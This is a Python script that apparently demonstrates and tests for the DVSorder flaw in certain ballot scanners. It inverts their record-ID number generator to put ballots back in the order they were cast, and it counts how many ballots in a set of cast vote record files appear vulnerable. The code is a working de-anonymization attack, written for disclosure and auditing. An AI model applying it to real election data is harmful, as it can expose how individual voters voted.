#!/usr/bin/env python3
# *_* coding: utf-8 *_*
"""This program illustrates and tests for the DVSorder vulnerability.

Given a CSV- or zipped-JSON-format CVR file, it attempts to unshuffle
each batch of ballots. It outputs an estimate of the number of
vulnerable ballots in the file.

"""
import os
import sys
import csv
import json
import zipfile

def icp_get_nth(n):
    """Returns the nth element from the ICP's PRNG sequence."""
    x = 864803*n%1000000
    d = [5,0,8,3,2,6,1,9,4,7]
    return d[x//100%10]+d[x//1000%10]*10+d[x//10%10]*100+ \
        d[x//100000]*1000+d[x%10]*10000+d[x//10000%10]*100000

def ice_get_nth(n):
    """Returns the nth element from the ICE's PRNG sequence."""
    x = 864803*n%1000000
    d = [5,0,8,3,2,6,1,9,4,7]
    return d[x//10%10]+d[x//100000]*10+d[x%10]*100+ \
        d[x//10000%10]*1000+d[x//100%10]*10000+d[x//1000%10]*100000

# Dicts that give the index of each record_id in the sequence:
icp_inverse = {icp_get_nth(i): i for i in range(1000000)}
ice_inverse = {ice_get_nth(i): i for i in range(1000000)}

class AttackFailed(Exception):
    pass

def unshuffle(record_ids, scanner_model=None):
    """
    Unshuffles a batch of ballots.

    Parameters:
    record_ids (list): the record_ids from a batch of ballots
    scanner_model (string): "ImagecastPrecinct" or "ImagecastEvolution"
      If None, attempts to guess the scanner model.

    Returns a list of (index, record_id) tuples, ordered by index,
    and the minimum number of ballots that are missing from the sequence.
    """
    assert isinstance(record_ids, list)
    assert len(record_ids) == len(set(record_ids))
    if len(record_ids) == 0:
        return [], []
    ids = [r % 1000000 for r in record_ids]

    def reduce_indices(indices):
        """
        Given a list of possible record_id indices, shift as necessary
        to account for wrapping around the modulus. Returns
        the relative indices (with the lowest equal to zero).
        """
        lowest, highest = min(indices), max(indices)
        if lowest < 100 and highest > 999900:
            indices = [(i + 500000) % 1000000 for i in indices]
            lowest, highest = min(indices), max(indices)
        return [(i - lowest) for i in indices]

    def count_missing(indices):
        """
        Given a list of relative indices, returns the minimum
        number of ballots that are missing from the list. We use
        this to test whether the unshuffling is plausible. If it
        is not, the function returns 1000000.
        """
        span = max(indices)-min(indices)+1
        if span > len(indices)*10:
            return 1000000
        return span-len(indices)

    if scanner_model == "ImagecastPrecinct":
        indices = reduce_indices([icp_inverse[id] for id in ids])
        missing = count_missing(indices)
    elif scanner_model == "ImagecastEvolution":
        indices = reduce_indices([ice_inverse[id] for id in ids])
        missing = count_missing(indices)
    elif scanner_model is None:
        icp_indices = reduce_indices([icp_inverse[id] for id in ids])
        icp_missing = count_missing(icp_indices)
        ice_indices = reduce_indices([ice_inverse[id] for id in ids])
        ice_missing = count_missing(ice_indices)
        if icp_missing < ice_missing:
            indices,missing = icp_indices,icp_missing
        else:
            indices,missing = ice_indices,ice_missing
    else:
        raise AttackFailed

    if missing == 1000000:
        raise AttackFailed
    results = [(indices[i], ids[i]) for i in range(len(ids))]
    results.sort(key=lambda t: t[0])
    return results, missing

def read_csv_batches(input_filename):
    """
    Generator that yields batches from a CSV-format CVR export.

    Parameters:
    input_filename(string): CSV-format CVR file to read

    Yields a dict containing lists of record_ids for one or more batches.
    """
    infile = open(input_filename, mode='r')
    reader = csv.reader(infile)

    def csv_int(string):
        """Extracts integers from various CSV quoting styles."""
        if string[0] == '=' and string[1] == '"' and string[-1] == '"':
            return int(string[2:-1])
        return int(string)

    try:
        header_event = next(reader)
        header_contest = next(reader)
        header_choice = next(reader)
        header_ballot = next(reader)
    except StopIteration:
        raise ValueError

    print(f'event_name: {header_event[0]!r}, rtr_version: {header_event[1]!r}')

    if "Tabulator" in header_ballot:
        tab_n = header_ballot.index('Tabulator')
    else:
        tab_n = header_ballot.index('TabulatorNum')
    if "Tabulator" in header_ballot:
        bat_n = header_ballot.index('Batch')
    else:
        bat_n = header_ballot.index('BatchId')
    if "Record" in header_ballot:
        rec_n = header_ballot.index('Record')
    else:
        rec_n = header_ballot.index('RecordId')
    assert tab_n == 1 and bat_n == 2 and rec_n == 3

    batches = {}
    for row in reader:
        tab_id, bat_id, rec_id = csv_int(row[tab_n]), csv_int(row[bat_n]), csv_int(row[rec_n])
        if (tab_id, bat_id, None) not in batches:
            batches[(tab_id, bat_id, None)] = []
        batches[(tab_id, bat_id, None)] += [rec_id]

    yield batches

def read_json_zip_batches(input_filename):
    """
    Generator that yields batches from a zipped JSON-format CVR export..

    Parameters:
    input_filename(string): Zipped JSON-format CVR data to read.

    Yields a dict containing lists of record_ids for one or more batches.
    """
    source_zip = zipfile.ZipFile(input_filename)
    event_manifest = json.loads(source_zip.read('ElectionEventManifest.json'))
    print(f'description: {event_manifest["List"][0]["Description"]}, version: {event_manifest["Version"]}')

    tab_manifest = json.loads(source_zip.read('TabulatorManifest.json'))
    tab_models = {
        int(t['Id']): t['Type']
        for t in tab_manifest['List']
    }
    n_vulnerable_tabs = len([k for k,m in tab_models.items()
        if m in ['ImagecastPrecinct', 'ImagecastEvolution']])
    print([m for k,m in tab_models.items()
        if m in ['ImagecastPrecinct', 'ImagecastEvolution']])
    print(f'{n_vulnerable_tabs} of {len(tab_manifest["List"])} tabulators are vulnerable models')

    members = source_zip.namelist()
    for i, name in enumerate(members):
        batches = {}
        print(f'reading file {i+1} of {len(members)}, {name}')
        if name.startswith('CvrExport') and name.endswith('.json'):
            obj = json.loads(source_zip.read(name))
            for cvr in obj['Sessions']:
                tab_id, bat_id, rec_id, model = cvr['TabulatorId'], cvr['BatchId'], cvr['RecordId'], tab_models[cvr['TabulatorId']]
                if (tab_id, bat_id, model) not in batches:
                    batches[(tab_id, bat_id, model)] = []
                if rec_id == 'X':
                    print('skipping sanitized record', file=sys.stderr)
                    continue
                batches[(tab_id, bat_id, model)] += [rec_id]
        yield batches

def read_image_zip_batches(input_filename):
    """
    Generator that yields batches from a zipfile containing ballot images.

    Parameters:
    input_filename(string): Zip archive containing TIF ballot images.

    Yields a dict containing lists of record_ids for one or more batches.
    """
    with zipfile.ZipFile(input_filename) as zf:
        names = zf.namelist()

    batches = {}
    for name in names:
        base, ext = os.path.splitext(os.path.basename(name))
        if ext == ".tif":
            ids = base.split("_")
            try:
                tab_id, bat_id, rec_id = int(ids[0]), int(ids[1]), int(ids[2])
            except:
                print("skipping", name, file=sys.stderr)
                continue
            if (tab_id, bat_id, None) not in batches:
                batches[(tab_id, bat_id, None)] = []
            batches[(tab_id, bat_id, None)] += [rec_id]

    yield batches

def multi_file_reader(filenames, use_images):
    for filename in filenames:
        batch_reader = None
        if filename.endswith(".csv"):
            if use_images:
                raise Exception("Can't read images from a CSV file")
            batch_reader = read_csv_batches
        elif filename.endswith(".zip"):
            if use_images:
                batch_reader = read_image_zip_batches
            else:
                batch_reader = read_json_zip_batches
        else:
            raise Exception("Doesn't look like a .csv or .zip file")
        for result in batch_reader(filename):
            yield result

def process_files(filenames, use_images=False, show_unshuffled=True):
    """
    Processes ballots from a specified file.

    If show_unshuffled is True, prints the unshuffled record_ids
    from each vulnerable batch.
    """
    count_ballots = 0
    count_vulnerable = 0
    for batch_dict in multi_file_reader(filenames, use_images):
        for (tab_id, bat_id, model), batch in batch_dict.items():
            count_ballots += len(batch)
            try:
                results,fit = unshuffle(batch, scanner_model=model)
            except AttackFailed:
                print(f"tabulator {tab_id} batch {bat_id} appears safe ({len(batch)} ballots)")
                continue
            print(f"tabulator {tab_id} batch {bat_id} appears vulnerable ({len(batch)} ballots, missing {fit})")
            if show_unshuffled:
                print("unshuffled ballots:",results)
            count_vulnerable += len(batch)
    print(f"approximately {count_vulnerable} of {count_ballots} ballots ({int(100*count_vulnerable/count_ballots)}%) appear to be vulnerable")

if __name__ == "__main__":
    if len(sys.argv) >= 3 and sys.argv[1] == "--cvrs":
        process_files(sys.argv[2:], use_images=False)
    elif len(sys.argv) >= 3 and sys.argv[1] == "--images":
        process_files(sys.argv[2:], use_images=True)
    else:
        print(f"Usage: {sys.argv[0]} --images|cvrs FILE [FILE ...]")
        sys.exit(1)
